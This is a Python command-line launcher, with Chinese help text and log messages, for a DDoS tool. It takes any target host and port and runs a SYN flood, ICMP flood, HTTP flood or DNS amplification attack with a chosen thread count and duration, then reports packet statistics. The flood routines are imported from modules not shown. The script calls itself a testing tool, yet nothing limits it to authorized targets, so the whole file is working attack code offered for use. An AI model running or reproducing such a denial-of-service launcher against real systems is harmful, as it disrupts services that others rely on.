#!/usr/bin/env python3
import argparse
from attack.network.syn_flood import SYNFlood
from attack.network.icmp_flood import ICMPFlood
from attack.application.http_flood import HTTPFlood
from attack.application.dns_amp import DNSAmplification
from utils.logger import DDoSLogger
from utils.config import Config
import time
import sys

def parse_args():
    parser = argparse.ArgumentParser(description='DDoS攻击测试工具')
    parser.add_argument('-t', '--target', required=True,
                      help='目标IP地址或域名')
    parser.add_argument('-p', '--port', type=int, default=80,
                      help='目标端口号 (默认: 80)')
    parser.add_argument('-m', '--mode', required=True, choices=['syn', 'icmp', 'http', 'dns'],
                      help='攻击模式: syn(SYN Flood), icmp(ICMP Flood), http(HTTP Flood), dns(DNS Amplification)')
    parser.add_argument('--threads', type=int, default=4,
                      help='攻击线程数 (默认: 4)')
    parser.add_argument('--duration', type=int, default=10,
                      help='攻击持续时间(秒) (默认: 10)')
    parser.add_argument('--http-method', choices=['GET', 'POST'], default='GET',
                      help='HTTP攻击方法 (默认: GET)')
    return parser.parse_args()

def main():
    args = parse_args()
    config = Config()
    logger = DDoSLogger()
    
    logger.info(f"开始 {args.mode.upper()} Flood 攻击...")
    logger.info(f"目标: {args.target}:{args.port}")
    logger.info(f"线程数: {args.threads}")
    logger.info(f"持续时间: {args.duration}秒")
    
    try:
        # 选择攻击类型
        if args.mode == 'syn':
            attack = SYNFlood(args.target, args.port, args.threads)
        elif args.mode == 'icmp':
            attack = ICMPFlood(args.target, args.threads)
        elif args.mode == 'http':
            attack = HTTPFlood(f"http://{args.target}:{args.port}", 
                             args.threads, args.http_method)
        elif args.mode == 'dns':
            attack = DNSAmplification(args.target, num_threads=args.threads)
        
        # 启动攻击
        threads = attack.start_attack()
        
        # 等待指定时间
        time.sleep(args.duration)
        
        # 停止攻击
        stats = attack.stop_attack()
        
        # 等待所有线程结束
        for thread in threads:
            thread.join()
        
        # 显示统计信息
        logger.info("\n攻击统计:")
        logger.info(f"总发包数: {sum(stats['packets_sent'].values())}")
        logger.info(f"平均发包速率: {sum(stats['packets_per_second'].values()):.2f} 包/秒")
        
    except KeyboardInterrupt:
        logger.info("\n用户中断攻击")
        if 'attack' in locals():
            attack.stop_attack()
    except Exception as e:
        logger.error(f"攻击过程中出错: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 